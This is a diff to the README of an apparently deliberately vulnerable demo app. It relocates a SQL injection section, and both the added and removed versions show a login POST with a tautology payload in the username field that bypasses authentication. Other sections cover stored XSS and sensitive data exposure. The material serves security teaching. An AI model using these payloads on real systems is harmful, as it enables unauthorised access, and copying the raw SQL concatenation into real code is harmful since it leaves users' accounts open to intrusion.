@@ -57,6 +57,24 @@ The `insecure` branch intentionally contains multiple vulnerabilities.
 
 ---
 
+### SQL Injection
+
+The insecure login endpoint concatenates raw SQL.
+
+**Exploit:**
+
+```json
+POST /auth/login
+{
+   "username": "' OR 1=1 -- ",
+   "password": "x"
+}
+```
+
+Bypasses authentication.
+
+---
+
 ### Stored XSS
 
 User input is rendered directly in the UI without sanitization.
@@ -91,23 +109,6 @@ Triggers immediately.
 
 ---
 
-### SQL Injection
-
-The insecure login endpoint concatenates raw SQL.
-
-**Exploit:**
-
-```json
-POST /auth/login-insecure
-{
-  "username": "admin' OR '1'='1",
-  "password": "test"
-}
-```
-
-Bypasses authentication.
-
----
 
 ### Sensitive Data Exposure
 
